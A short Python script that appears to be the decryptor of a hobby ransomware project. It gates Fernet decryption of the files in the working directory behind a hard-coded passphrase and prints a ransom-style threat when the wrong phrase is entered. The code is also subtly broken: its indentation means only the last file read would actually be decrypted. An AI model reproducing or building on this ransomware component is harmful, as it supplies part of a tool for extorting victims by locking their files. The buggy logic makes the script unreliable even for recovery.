#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# let's find some files

files = []

for file in os.listdir():
        if file == "voldemort.py" or file == "masterkey.key" or file == "potter.py":
                continue
        if os.path.isfile(file):
                files.append(file)
                
print(files)

with open("masterkey.key", "rb") as key:
        secretkey = key.read()
        
secretphrase = "yonasuriv"

user_phrase = input("Enter the secret phrase to decrypt your files:\n")

if user_phrase == secretphrase:
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
            print("Congratulations, your files have been decrypted.")
else:
            print("Wrong Secret Phrase, your time is running out.")
